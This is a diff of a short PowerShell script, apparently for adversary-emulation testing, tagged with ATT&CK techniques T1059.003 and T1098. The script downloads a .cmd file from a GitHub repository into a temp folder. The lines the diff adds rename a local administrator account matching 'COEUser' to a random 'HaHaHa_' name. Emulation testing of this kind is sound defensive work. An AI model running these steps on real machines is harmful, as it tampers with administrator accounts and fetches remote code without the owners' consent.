@@ -1,2 +1,20 @@
 New-Item -Type Directory (split-path $env:temp\aet\kaskaskia\src\t1059.003_read_execute_cmd_file.cmd) -ErrorAction ignore | Out-Null
 Invoke-WebRequest "https://github.com/jsprat000/bin/blob/main/t1059.003_read_execute_cmd_file.cmd" -OutFile "$env:temp\aet\kaskaskia\src\t1059.003_read_execute_cmd_file.cmd"
+
+T1098
+$x = Get-Random -Minimum 2 -Maximum 9999
+$y = Get-Random -Minimum 2 -Maximum 9999
+$z = Get-Random -Minimum 2 -Maximum 9999
+$w = Get-Random -Minimum 2 -Maximum 9999
+Write-Host HaHaHa_$x$y$z$w
+
+$hostname = (Get-CIMInstance CIM_ComputerSystem).Name
+
+$fmm = Get-CimInstance -ClassName win32_group -Filter "name = 'Administrators'" | Get-CimAssociatedInstance -Association win32_groupuser | Select Name
+
+foreach($member in $fmm) {
+    if($member -like "*.\COEUser*") {
+        Rename-LocalUser -Name $member.Name -NewName "HaHaHa_$x$y$z$w"
+        Write-Host "Successfully Renamed Administrator Account on" $hostname
+        }
+    }
